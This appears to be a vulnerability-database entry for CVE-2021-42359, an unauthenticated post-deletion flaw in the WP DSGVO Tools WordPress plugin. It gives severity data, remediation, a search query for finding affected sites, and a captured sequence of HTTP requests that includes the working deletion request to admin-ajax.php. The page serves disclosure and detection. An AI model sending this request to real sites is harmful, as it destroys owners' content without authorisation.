---
layout: "post"
cve_id: "CVE-2021-42359"
title: "WP DSGVO Tools (GDPR) <= 3.1.23 - Unauthenticated Arbitrary Post Deletion"
pcap: true
pcap_path: "/pcaps/2021/CVE-2021-42359.pcap"
nuclei_url: "https://github.com/packetinside/nuclei-templates/blob/main/http/cves/2021/CVE-2021-42359.yaml"
author: "daffainfo"
severity: "high"
impact: "Unauthenticated attackers can permanently delete arbitrary WordPress posts and pages by exploiting the unprotected admin-dismiss-unsubscribe AJAX action.
"
remediation: "Upgrade to WP DSGVO Tools version 3.1.24 or later.
"
reference:
  - "https://www.wordfence.com/blog/2021/11/vulnerability-in-wp-dsgvo-tools-gdpr-plugin-allows-unauthenticated-page-deletion/"
  - "https://nvd.nist.gov/vuln/detail/CVE-2021-42359"
classification: "{'cvss-metrics': 'CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H', 'cvss-score': 7.5, 'cve-id': 'CVE-2021-42359', 'epss-score': 0.20875, 'epss-percentile': 0.95434, 'cwe-id': 'CWE-862,CWE-284', 'cpe': 'cpe:2.3:a:legalweb:wp_dsgvo_tools:*:*:*:*:*:wordpress:*:*'}"
metadata: "{'verified': True, 'max-request': 5, 'vendor': 'legalweb', 'product': 'wp_dsgvo_tools', 'framework': 'wordpress', 'fofa-query': 'body="/wp-content/plugins/shapepress-dsgvo/"', 'publicwww-query': '/wp-content/plugins/shapepress-dsgvo/'}"
tags:
  - "cve"
  - "cve2021"
  - "wp"
  - "wordpress"
  - "wp-plugin"
  - "dsgvo"
  - "intrusive"
  - "vkev"
  - "vuln"
snort2_rule: |
  N/A
snort3_rule: |
  N/A
---

## ðŸ” Vulnerability Description
WP DSGVO Tools (GDPR) <= 3.1.23 had an AJAX action, â€˜admin-dismiss-unsubscribeâ€˜, which lacked a capability check and a nonce check and was available to unauthenticated users, and did not check the post type when deleting unsubscription requests. As such, it was possible for an attacker to permanently delete an arbitrary post or page on the site by sending an AJAX request with the â€œactionâ€ parameter set to â€œadmin-dismiss-unsubscribeâ€ and the â€œidâ€ parameter set to the post to be deleted. Sending such a request would move the post to the trash, and repeating the request would permanently delete the post in question.


## ðŸŒ HTTP Request
```nohighlight
GET /?rest_route=/wp/v2/posts HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (Windows; U; Windows NT 6.1; ja-JP) AppleWebKit/533.20.25 (KHTML, like Gecko) Version/5.0.3 Safari/533.19.4
Accept: */*
Accept-Language: en
Accept-Encoding: gzip
```

```nohighlight
GET /wp-json/wp/v2/posts HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (ZZ; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36
Accept: */*
Accept-Language: en
Accept-Encoding: gzip
```

```nohighlight
POST /wp-admin/admin-ajax.php HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; WebView/3.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.140 Safari/537.36 Edge/18.17763
Connection: close
Content-Length: 42
Content-Type: application/x-www-form-urlencoded
Accept-Encoding: gzip

action=admin-dismiss-unsubscribe&id=Hw4hLw
```

```nohighlight
GET /wp-json/wp/v2/posts HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (X11; Linux i686; rv:1.9.6.20) Gecko/ Firefox/3.6.16
Accept: */*
Accept-Language: en
Accept-Encoding: gzip
```

```nohighlight
GET /?rest_route=/wp/v2/posts HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36
Accept: */*
Accept-Language: en
Accept-Encoding: gzip
```

